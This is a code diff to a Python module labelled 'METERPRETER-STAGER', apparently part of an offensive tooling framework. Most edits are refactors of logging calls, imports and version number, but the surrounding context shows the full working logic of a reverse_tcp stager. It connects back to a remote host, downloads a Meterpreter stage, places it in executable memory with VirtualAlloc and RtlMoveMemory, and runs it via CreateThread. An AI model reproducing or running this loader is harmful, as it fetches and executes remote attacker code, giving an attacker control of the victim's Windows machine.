@@ -9,8 +9,8 @@
 from utils.style import *
 from os import name as osname
 if osname == 'nt':
-    from utils.windef import *
-    from utils.winconst import *
+    from utils.windef import CreateThread, WaitForSingleObject, VirtualAlloc, RtlMoveMemory
+    from utils.winconst import MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE
 from time import sleep
 import socket
 import struct
@@ -18,7 +18,8 @@ import struct
 CATEGORY    = 'stager'
 DESCRIPTION = 'Connect back (reverse_tcp) to remote host and receive a stage'
 
-cs = ConsoleStyles()
+css = ConsoleStyles()
+cs_print = css.console_print()
 
 arglist = {
     'remote_host':         { 'value': None, 'desc': 'Remote host to connect to' },
@@ -40,15 +41,15 @@ def register_arguments(parser):
 class module:
     
     Author          = 'raptor@0xdeadbeef.info, psycore8'
-    Version         = '0.9.0'
+    Version         = '1.0.1'
     DisplayName      = 'METERPRETER-STAGER'
-    payload         = any
+    payload         = bytearray()
     payload_size    = int
     sock            = any
     relay_output    = False
     shell_path      = '::stager::meterpreter'
 
-    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
+    def __init__(self, remote_host:str, remote_port:int, timeout:int, architecture:str, sleeptime:int):
         self.remote_host = remote_host
         self.remote_port = remote_port
         self.timeout = timeout
@@ -56,14 +57,14 @@ class module:
         self.sleeptime = sleeptime
 
     def CreateSocket(self):
-        cs.console_print.note('Creating Socket...')
+        cs_print.note('Creating Socket...')
         socket.setdefaulttimeout(self.timeout)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         con = self.sock.connect_ex((self.remote_host, int(self.remote_port)))
         if con == 0:
-            cs.console_print.ok('Connection established')
+            cs_print.ok('Connection established')
         else:
-            cs.console_print.error('Connection failed')
+            cs_print.error('Connection failed')
             return
 
     def ReceivePayload(self):
@@ -71,12 +72,12 @@ class module:
         l = struct.unpack("@I", self.sock.recv(4))[0]
 
         # download payload
-        cs.console_print.note('Download stage...')
+        cs_print.note('Download stage...')
         d = self.sock.recv(l)
         while len(d) < l:
             d += self.sock.recv(l - len(d))
         self.payload_size = len(d)
-        cs.console_print.note(f'Payload size: {self.payload_size} bytes')
+        cs_print.note(f'Payload size: {self.payload_size} bytes')
 
         if self.architecture == 'x64':
             self.payload = bytearray(
@@ -89,34 +90,35 @@ class module:
                     + self.sock.fileno().to_bytes(4, byteorder="little")
                     + d)
         if self.payload:
-            cs.console_print.ok('Stage downloaded!')
+            cs_print.ok('Stage downloaded!')
             #self.msg('proc.stage_ok')
         else:
-            cs.console_print.error('Error during download')
+            cs_print.error('Error during download')
+            self.payload = bytearray()
             return
             
     def LaunchStage(self):
-        cs.console_print.note('Trying to execute Meterpreter stage...')
+        cs_print.note('Trying to execute Meterpreter stage...')
         ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if ptr:
-            cs.console_print.ok('Memory allocated!')
+            cs_print.ok('Memory allocated!')
             RtlMoveMemory(ptr, bytes(self.payload), len(self.payload))
 
         if self.sleeptime > 0:
-            cs.console_print.info(f'Let\'s take a nap for {self.sleeptime} seconds')
+            cs_print.info(f'Let\'s take a nap for {self.sleeptime} seconds')
             sleep(self.sleeptime)
         
-        cs.console_print.note('Execute payload...')
+        cs_print.note('Execute payload...')
         ht = CreateThread(None, 0, ptr, None, 0, None)
         if ht:
-            cs.console_print.ok('Thread created. Looks good!')
+            cs_print.ok('Thread created. Looks good!')
         else:
-            cs.console_print.error('Payload not executed')
+            cs_print.error('Payload not executed')
             return
         WaitForSingleObject(ht, -1)    
 
     def process(self):
-        cs.module_header(self.DisplayName, self.Version)
+        css.module_header(self.DisplayName, self.Version)
         self.CreateSocket()
         self.ReceivePayload()
         if self.relay_output:
